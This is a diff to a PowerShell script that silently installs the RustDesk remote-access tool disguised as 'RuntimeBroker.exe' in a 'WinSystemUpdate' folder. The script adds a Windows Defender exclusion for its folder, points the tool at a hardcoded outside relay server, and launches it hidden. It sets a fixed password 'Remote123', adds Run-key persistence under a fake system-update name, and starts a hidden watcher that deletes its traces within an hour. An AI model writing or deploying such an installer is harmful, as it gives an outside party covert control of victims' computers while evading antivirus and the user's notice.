@@ -8,6 +8,7 @@ function Install-RD {
 
     try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
+    # Kill old + clean
     Get-Process RuntimeBroker -EA SilentlyContinue |
         Where-Object { $_.Path -like '*WinSystem*' } |
         Stop-Process -Force -EA SilentlyContinue
@@ -24,12 +25,10 @@ function Install-RD {
     Unblock-File $DLL -EA SilentlyContinue
 
     if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
-        Write-Host 'Download failed!' -ForegroundColor Red; return
+        Write-Host "Download failed!" -ForegroundColor Red; return
     }
 
-    # Config:
-    # approve-mode = 'password-click' -> both password AND manual click work
-    # allow-only-conn-window-open = 'N' -> closing popup does NOT kill connection
+    # Config
     @'
 rendezvous_server = '34.107.221.82'
 relay_server = '34.107.221.82'
@@ -56,21 +55,17 @@ key_confirmed = true
 
     # Start RustDesk hidden
     $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName         = $EXE
-    $psi.WorkingDirectory = $DEST
-    $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute  = $true
+    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
+    $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.UseShellExecute=$true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     Start-Sleep 5
 
     # Get ID
     $psiId = New-Object System.Diagnostics.ProcessStartInfo
-    $psiId.FileName               = $EXE
-    $psiId.Arguments              = '--get-id'
-    $psiId.UseShellExecute        = $false
-    $psiId.RedirectStandardOutput = $true
-    $psiId.CreateNoWindow         = $true
-    $psiId.WorkingDirectory       = $DEST
+    $psiId.FileName=$EXE; $psiId.Arguments='--get-id'
+    $psiId.UseShellExecute=$false; $psiId.RedirectStandardOutput=$true
+    $psiId.CreateNoWindow=$true; $psiId.WorkingDirectory=$DEST
     $prId = [System.Diagnostics.Process]::Start($psiId)
     $outT = $prId.StandardOutput.ReadToEndAsync()
     $prId.WaitForExit(8000) | Out-Null
@@ -80,7 +75,7 @@ key_confirmed = true
     $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force
 
-    # Cleanup script
+    # Delete script
     $del = "$DEST\delete.ps1"
     Set-Content $del @'
 $d = "$env:LOCALAPPDATA\WinSystemUpdate"
@@ -93,26 +88,25 @@ Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
     # Watcher - auto deletes when process stops OR after 1 hour
     $watch = "$DEST\watch.ps1"
     Set-Content $watch @'
-$EXE  = "$env:LOCALAPPDATA\WinSystemUpdate\RuntimeBroker.exe"
-$del  = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
+$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\RuntimeBroker.exe"
+$del      = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
 $deadline = [DateTime]::Now.AddHours(1)
-
 while ([DateTime]::Now -lt $deadline) {
     Start-Sleep 10
     $alive = Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
     if (-not $alive) { break }
 }
-
 if (Test-Path $del) { & $del }
 '@ -Encoding UTF8
 
-    # Start watcher silently in background
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
 
-    # Show ID in a small popup - the only thing visible to the user
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show(
-        "Your Remote ID: $RDID`n`nPassword: Remote123`n`nShare this ID to connect.",
-        'Remote Access Ready', 'OK', 'Information') | Out-Null
+    # Print ID and password clearly in the CMD window
+    Write-Host ""
+    Write-Host "  ============================" -ForegroundColor Green
+    Write-Host "  ID       : $RDID"             -ForegroundColor Cyan
+    Write-Host "  Password : Remote123"          -ForegroundColor Cyan
+    Write-Host "  ============================" -ForegroundColor Green
+    Write-Host ""
 }
 Install-RD
